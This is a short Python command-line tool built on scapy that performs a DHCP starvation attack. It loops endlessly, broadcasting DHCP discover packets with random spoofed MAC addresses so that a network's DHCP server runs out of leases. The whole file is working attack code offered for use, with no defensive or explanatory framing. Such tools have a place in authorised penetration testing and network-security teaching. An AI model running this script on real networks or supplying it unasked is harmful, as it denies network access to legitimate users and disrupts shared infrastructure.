import click
from scapy.all import ICMP, IP, conf, sr1, UDP, TCP, Ether, BOOTP, DHCP, get_if_raw_hwaddr, RandMAC, srp


@click.command()
@click.option('-i', 'iface', default=None, help='Interface to use')
@click.option('-t', 'timeout', default=5, help='Time (seconds) to wait for responses')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose output')
def cmd_dhcp_starvation(iface, timeout, verbose):

    conf.verb = False

    if iface:
        conf.iface = iface

    conf.checkIPaddr = False

    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0",dst="255.255.255.255")
    udp = UDP(sport=68,dport=67)
    dhcp = DHCP(options=[("message-type","discover"),"end"])

    while True:
        bootp = BOOTP(chaddr=str(RandMAC()))
        dhcp_discover = ether / ip / udp / bootp / dhcp
        ans, unans = srp(dhcp_discover, timeout=5)      # Press CTRL-C after several seconds

        for _, pkt in ans:
            if verbose:
                print(pkt.show())
            else:
                print(pkt.summary())


if __name__ == '__main__':
    cmd_dhcp_starvation()

